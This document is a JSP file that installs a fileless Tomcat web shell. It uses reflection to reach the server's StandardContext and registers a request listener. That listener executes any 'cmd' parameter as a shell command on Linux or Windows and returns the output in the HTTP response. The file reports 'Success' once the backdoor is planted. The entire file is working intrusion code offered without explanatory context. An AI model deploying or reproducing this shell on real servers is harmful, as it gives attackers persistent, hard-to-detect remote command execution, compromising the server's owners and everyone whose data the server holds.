<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="java.io.PrintWriter" %>
<%@ page contentType="text/html;charset=UTF-8" pageEncoding="UTF-8" language="java" %>

<%
    final String name = "test_listener";

    try {
        ServletContext servletContext = request.getSession().getServletContext();
        Field appctx = servletContext.getClass().getDeclaredField("context");
        appctx.setAccessible(true);
        ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

        Field stdctx = applicationContext.getClass().getDeclaredField("context");
        stdctx.setAccessible(true);
        StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

        ServletRequestListener listener = new ServletRequestListener() {
            @Override
            public void requestDestroyed(ServletRequestEvent sre) {
                HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
                if (req.getParameter("cmd") != null) {
                    boolean isLinux = true;
                    String osTyp = System.getProperty("os.name");
                    if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                        isLinux = false;
                    }
                    String[] cmds = isLinux ? new String[]{"sh", "-c", req.getParameter("cmd")} : new String[]{"cmd.exe", "/c", req.getParameter("cmd")};
                    try {
                        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                        Scanner s = new Scanner(in).useDelimiter("\\A");
                        String output = s.hasNext() ? s.next() : "";
                        Field requestF = req.getClass().getDeclaredField("request");
                        requestF.setAccessible(true);
                        Request request1 = (Request) requestF.get(req);
                        PrintWriter out = request1.getResponse().getWriter();
                        out.println(output);
                        out.flush();
                        out.close();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }

            @Override
            public void requestInitialized(ServletRequestEvent sre) {

            }
        };
        standardContext.addApplicationEventListener(listener);
        response.getWriter().write("Success");
    } catch (Exception e) {
        e.printStackTrace();
    }
%>